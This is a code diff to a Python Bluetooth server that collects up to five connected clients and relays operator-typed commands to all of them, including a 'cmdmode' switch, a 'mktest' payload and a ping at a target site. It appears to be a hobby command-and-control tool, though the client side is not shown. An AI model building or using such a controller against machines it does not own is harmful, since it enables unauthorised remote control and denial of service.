@@ -1,6 +1,8 @@
 import socket
 import pyautogui
-from ShellUi import textupdate
+import keyboard
+from time import sleep
+from ShellUi import textupdate,window
 
 connected = []
 server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
@@ -8,12 +10,14 @@ server.bind(("6c:2f:80:71:84:8b", 4))
 server.listen(1)
 
 # Checks for any clients that want to connect
-while len(connected) < 4:#not ServerUi.Start and ServerUi.window.winfo_exists():
+while len(connected) < 5:
     client, addr = server.accept()
     hn = client.recv(1024)
     connected.append([client,addr,hn.decode(),False])
-    textupdate(hn.decode(),"has connected with address",addr[0])
-
+    textupdate(hn.decode()+" has connected with address "+addr[0])
+    textupdate()
+textupdate("Max amount of clients, entering shell")
+textupdate()
 
 # Sends any commands to all clients that are connected
 def SendToClients(mess:str):
@@ -51,18 +55,28 @@ pinga = ("ping",targetsite)
 
 
 
-
+text = ""
 try:
-    while True:#ServerUi.window.winfo_exists():
-        act = input("Send Message: ")
-        if act == "1":
-            connect() 
-        elif act == "test":
-            SendToClients("cmdmode")
-            SendToClients(mktest)
-        else:
-            SendToClients(act)
+    while True:
+        key = keyboard.read_key()
 
+        if key == 'enter':
+            textupdate()
+            if text == "1":
+                connect() 
+            elif text == "test":
+                SendToClients("cmdmode")
+                SendToClients(mktest)
+            else:
+                SendToClients(text)
+            text = ""
+        elif key == "backspace":
+            text = text[0:len(text)-1]
+            textupdate(text)
+        elif key != "":
+            text += key
+            textupdate(text)
+        sleep(.1)
 except OSError as e:
     pass
 
